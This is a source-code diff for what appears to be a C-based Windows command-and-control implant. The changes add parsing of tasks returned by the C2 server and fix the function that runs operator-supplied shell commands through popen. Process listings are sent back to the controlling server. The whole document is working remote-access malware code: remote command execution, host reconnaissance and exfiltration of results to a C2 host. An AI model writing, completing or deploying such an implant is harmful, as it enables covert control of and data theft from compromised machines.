@@ -55,7 +55,7 @@ void enqueue(Queue *q, task_t val){
 task_t dequeue(Queue *q){
     if(isEmpty(q)){
         printf("queue empty :(\n");
-        return 0;
+        return NULL;
     }
     task_t ret = q->items[q->front];
     q->front = (q->front + 1) %MAX_SIZE;
@@ -209,7 +209,27 @@ void checkin(){
     free(resp);
     cJSON_Delete(root);
 }
-	
+void parse_tasks(char* resp){
+cJSON *root = cJSON_Parse(resp);
+if (root != NULL) {
+cJSON *tasks = cJSON_GetObjectItemCaseSensitive(root, "tasks");
+if(cJSON_IsArray(tasks)){
+cJSON *task = NULL;
+cJSON_ArrayForEach(task,tasks){
+    //dispatcher(task);
+    cJSON* d_task = cJSON_Duplicate(task,1);
+    enqueue(&q, d_task);
+                              }
+
+                       }
+
+                 }
+//free(resp);
+cJSON_Delete(root);
+return;
+              }
+
+
 void get_tasks(){
 char* tasks_json = send_c2_post_request("{\"action\": \"get_tasking\", \"tasking_size\": -1}");
 cJSON *root = cJSON_Parse(tasks_json);
@@ -244,12 +264,12 @@ char* handle_shell_cmd(cJSON *task){
      char *command = cJSON_GetObjectItemCaseSensitive(task, "parameters")->valuestring;
      char output[512];
 size_t read;
-     fp = popen(command,"r"); 
+     fp = popen(command,"r");// when not compiling via minGW use _popen (afaik) 
          read = fread(output, 1, 512, fp);
     fclose(fp);
 
 char* ret_val = (char*)calloc(1,read+1);
-output[read] = '\0'
+output[read] = '\0';
 strncpy(ret_val,output,read+1);
 return ret_val;
 }
@@ -323,7 +343,9 @@ void dispatcher(cJSON *task){
             cJSON_AddItemToArray(arr,obj1);
 
         char* command_executed = cJSON_PrintUnformatted(root);
-        send_c2_post_request(command_executed);
+        char* ans = send_c2_post_request(command_executed);
+        parse_tasks(ans);
+        free(ans);
         free(command_executed);
         free(command_output);
         cJSON_Delete(root);
@@ -372,13 +394,14 @@ void handle_ps_cmd(cJSON *task){
         snprintf(process_buff,272,"%ld;%ld;%s\n",proces.th32ProcessID,proces.th32ParentProcessID,proces.szExeFile);
             strncat(buff,process_buff,sizeof(buff) - strlen(buff) - 1);
         counter++;
-        if(counter>=4){ //TODO: in last loop iteration, if counter>=4 data is lost 
+        if(counter>=4){ 
             cJSON_AddStringToObject(user_input_p,"user_output",buff);
             cJSON_AddStringToObject(user_input_p,"task_id",cJSON_GetObjectItemCaseSensitive(task,"id")->valuestring); 
             char* sent = cJSON_PrintUnformatted(root);
-            send_c2_post_request(sent);
+            char* ans = send_c2_post_request(sent);
+            parse_tasks(ans);
+            free(ans);
             free(sent);
-             //TODO: somehow handle the answer from C2 server (tasks) 
             cJSON_DeleteItemFromObject(user_input_p, "user_output");
             user_input_p = cJSON_CreateObject();
             cJSON_AddItemToArray(arr,user_input_p);
@@ -386,16 +409,17 @@ void handle_ps_cmd(cJSON *task){
             buff[0] = '\0';
 
         }
-     }while (Process32Next(han,&proces));
+    }while (Process32Next(han,&proces));
  }
 
 if(counter>0){
 cJSON_AddStringToObject(user_input_p,"user_output",buff);
             cJSON_AddStringToObject(user_input_p,"task_id",cJSON_GetObjectItemCaseSensitive(task,"id")->valuestring); 
             char* sent = cJSON_PrintUnformatted(root);
-            send_c2_post_request(sent);
+            char* ans = send_c2_post_request(sent);
+            parse_tasks(ans);
+            free(ans);
             free(sent);
-             //TODO: somehow handle the answer from C2 server (tasks) 
             cJSON_DeleteItemFromObject(user_input_p, "user_output");
             user_input_p = cJSON_CreateObject();
             cJSON_AddItemToArray(arr,user_input_p);
@@ -411,7 +435,9 @@ cJSON_SetBoolValue(completed, 1);
 
 //cJSON_DeleteItemFromObject(cJSON_GetObjectItemCaseSensitive(obj,"user_output"),);
 char* unformatted_buff = cJSON_PrintUnformatted(root);
-send_c2_post_request(unformatted_buff);
+char* ans = send_c2_post_request(unformatted_buff);
+parse_tasks(ans);
+free(ans);
 cJSON_Delete(root);
 CloseHandle(han);
 free(unformatted_buff);
